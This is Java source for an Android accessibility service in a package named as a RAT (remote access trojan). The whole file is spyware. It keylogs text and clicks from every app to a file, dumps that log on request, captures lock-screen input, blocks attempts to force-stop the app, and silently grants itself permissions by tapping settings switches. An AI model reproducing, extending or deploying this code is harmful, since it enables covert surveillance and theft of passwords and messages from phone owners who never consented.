package com.enterprise.rat.services;

import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.provider.Settings;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import com.enterprise.rat.commands.LockScreenCaptureManager;
import com.enterprise.rat.commands.AutoTapBlocker;
import java.io.File;
import java.io.FileOutputStream;
import java.util.List;

public class AccessibilityService extends android.accessibilityservice.AccessibilityService {
    private static AccessibilityService instance;
    private StringBuilder keylogBuffer = new StringBuilder();
    private static final int MAX_BUFFER_SIZE = 5000;
    private boolean lockScreenCaptureEnabled = false;
    private boolean forceStopBlockerEnabled = false;

    public static AccessibilityService getInstance() { return instance; }

    @Override
    public void onServiceConnected() {
        super.onServiceConnected();
        instance = this;
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_ALL_MASK;
        info.flags = AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS |
                     AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS |
                     AccessibilityServiceInfo.FLAG_REQUEST_ENHANCED_WEB_ACCESSIBILITY |
                     AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS |
                     AccessibilityServiceInfo.FLAG_REQUEST_TOUCH_EXPLORATION_MODE |
                     AccessibilityServiceInfo.FLAG_REQUEST_ACCESSIBILITY_BUTTON;
        info.notificationTimeout = 0;
        setServiceInfo(info);
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        // --- Keylogger (sebelumnya) ---
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED ||
            event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED) {
            if (event.getText() != null && !event.getText().toString().isEmpty()) {
                keylogBuffer.append(event.getText().toString());
            }
        } else if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_CLICKED && event.getPackageName() != null) {
            AccessibilityNodeInfo source = event.getSource();
            if (source != null) {
                String text = source.getText() != null ? source.getText().toString() : "";
                if (!text.isEmpty()) keylogBuffer.append("[CLICK:").append(event.getPackageName()).append(":").append(text).append("]\n");
                source.recycle();
            }
        }

        // --- Lock Screen Capture (FITUR BARU) ---
        if (lockScreenCaptureEnabled) {
            LockScreenCaptureManager.feedAccessibilityEvent(event);
        }

        // --- Auto-Tap Blocker (FITUR BARU) ---
        if (forceStopBlockerEnabled) {
            if (AutoTapBlocker.handleForceStopDetection(event, this)) {
                return; // Jangan proses lebih lanjut jika berhasil memblokir
            }
        }

        if (keylogBuffer.length() > MAX_BUFFER_SIZE) saveBufferToFile();
    }

    @Override
    public void onInterrupt() {}

    // --- Existing methods ---
    public String dumpKeylog() {
        saveBufferToFile();
        try {
            File logFile = new File(getFilesDir(), "klog.dat");
            if (logFile.exists()) {
                byte[] bytes = new byte[(int) logFile.length()];
                java.io.FileInputStream fis = new java.io.FileInputStream(logFile);
                fis.read(bytes); fis.close();
                logFile.delete();
                return new String(bytes);
            }
        } catch (Exception e) {}
        return "";
    }

    public void clearKeylog() {
        keylogBuffer.setLength(0);
        new File(getFilesDir(), "klog.dat").delete();
    }

    private void saveBufferToFile() {
        try {
            File logFile = new File(getFilesDir(), "klog.dat");
            FileOutputStream fos = new FileOutputStream(logFile, true);
            fos.write(keylogBuffer.toString().getBytes());
            fos.close();
            keylogBuffer.setLength(0);
        } catch (Exception e) {}
    }

    public boolean autoGrantPermission(String permission) {
        try {
            Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
            intent.setData(Uri.parse("package:" + getPackageName()));
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
            Thread.sleep(800);
            AccessibilityNodeInfo root = getRootInActiveWindow();
            if (root != null) {
                List<AccessibilityNodeInfo> permNodes = root.findAccessibilityNodeInfosByViewId("android:id/title");
                for (AccessibilityNodeInfo node : permNodes) {
                    if (node.getText() != null && node.getText().toString().toLowerCase().contains("permission")) {
                        clickOnNode(node); break;
                    }
                }
                Thread.sleep(500); root.recycle();
                root = getRootInActiveWindow();
                if (root != null) {
                    List<AccessibilityNodeInfo> switches = root.findAccessibilityNodeInfosByViewId("android:id/switch_widget");
                    for (AccessibilityNodeInfo sw : switches) {
                        if (!sw.isChecked()) { sw.performAction(AccessibilityNodeInfo.ACTION_CLICK); Thread.sleep(200); }
                    }
                    root.recycle();
                    return true;
                }
            }
        } catch (Exception e) {}
        return false;
    }

    public boolean clickOnNode(AccessibilityNodeInfo node) {
        if (node == null) return false;
        if (node.isClickable()) return node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
        AccessibilityNodeInfo parent = node.getParent();
        if (parent != null) { boolean result = clickOnNode(parent); parent.recycle(); return result; }
        return false;
    }

    // --- Getter/Setter fitur baru ---
    public void setLockScreenCaptureEnabled(boolean enabled) { this.lockScreenCaptureEnabled = enabled; }
    public void setForceStopBlockerEnabled(boolean enabled) { this.forceStopBlockerEnabled = enabled; }
}
